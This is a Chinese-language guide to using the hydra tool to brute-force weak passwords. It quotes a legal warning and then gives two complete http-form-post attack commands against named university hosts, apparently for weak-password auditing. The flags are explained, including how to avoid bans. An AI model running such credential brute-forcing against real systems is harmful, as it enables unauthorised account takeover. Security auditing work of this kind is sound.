# 使用 hydra 进行弱口令暴力破解

## 简述

hydra 是一个用于进行弱口令暴力破解的工具, 支持非常之多的协议, 是同类软件中的佼佼者

## 安全提醒

>>  根据《中华人民共和国治安管理处罚法》第二十九条规定： 有下列行为之一的，处五日以下拘留；情节较重的，处五日以上十日以下拘留：
>>
>>  (一)违反国家规定，侵入计算机信息系统，造成危害的；
>>
>> (二)违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行的；
>>
>> (三)违反国家规定，对计算机信息系统中存储、处理、传输的数据和应用程序进行删除、修改、增加的；
>>
>> (四)故意制作、传播计算机病毒等破坏性程序，影响计算机信息系统正常运行的。

## 安装

debian 系列系统, 可使用 `apt` 进行安装: `apt-get install hydra`

## 使用

hydra 需要依赖部分字典文件: 用户名/密码, 我们需要提供两个字典文件.

根据需要, 我们在该文档中提供了两个简单的字典文件, 可自行根据需要补充

其他更多说明请查看 [hydra 官方文档](https://www.thc.org/thc-hydra/)

hydra 检测支持协议、性能比较, 请查看 [这里](https://www.thc.org/thc-hydra/network_password_cracker_comparison.html)

## 部分产品弱口令扫描方法

### Lims-CF 弱口令检测

```
hydra less.nankai.edu.cn \
    http-form-post  \
    `"/login:token=^USER^&password=^PASS^&token_backend=database&submit=1:S=登出"` \
    -L users.txt \
    -P passwords.txt \
    -t 10 \
    -w 10 \
    -o lims2-cf.txt
```

* `less.nankai.edu.cn` 为测试服务器地址
* `http-form-post` 为 post 请求
* `"/login:token=^USER^&password=^PASS^&token_backend=database&submit=1:S=登出"` 分别分析:
    * /login 访问 login 页面
    * token 值为 `^USER^`, hydra 会依次从 users.txt 中读取
    * pasword  值为 `^PASS^`, hydra 会依次从 passwords.txt 中读取
    * token_backend 设定进行 本地用户 检测
    * submit 进行 submit 提交(lims2 中需要有 submit 才进行逻辑判断)
    * S 为 success 匹配结果, 即, 页面检测到了 登出, 则表示登录成功!
* `-L users.txt`, 设置可能弱口令的遍历用户
* `-P passwords.txt` 设置弱口令列表
* `-t 10`, 设定线程数
* `-w 10`, 设置等待时间(避免过多时间内请求导致被 ban 了)
* `-o lims2-cf.txt`, 设置结果输出


### mall

```
hydra beta.mall.nankai.edu.cn \
    http-form-post  \
    "/login:username=^USER^&password=^PASS^&backend=database:错误" \
    -L users.txt \
    -P passwords.txt \
    -t 10 \
    -w 10 \
    -o mall.txt
```

* `beta.mall.nankai.edu.cn` 为测试服务器地址
* `http-form-post` 为 post 请求
* `"/login:username=^USER^&password=^PASS^&token_backend=database&submit=1:S=登出"` 分别分析:
    * /login 访问 login 页面
    * username 值为 `^USER^`, hydra 会依次从 users.txt 中读取
    * pasword  值为 `^PASS^`, hydra 会依次从 passwords.txt 中读取
    * backend 值设定为 database, 进行 **本地用户** 检测
    * **错误** 为页面匹配到 **错误** 字样, 说明检测失败, 反之, 成功!
* `-L users.txt`, 设置可能弱口令的遍历用户
* `-P passwords.txt` 设置弱口令列表
* `-t 10`, 设定线程数
* `-w 10`, 设置等待时间(避免过多时间内请求导致被 ban 了)
* `-o mall.txt`, 设置结果输出
```
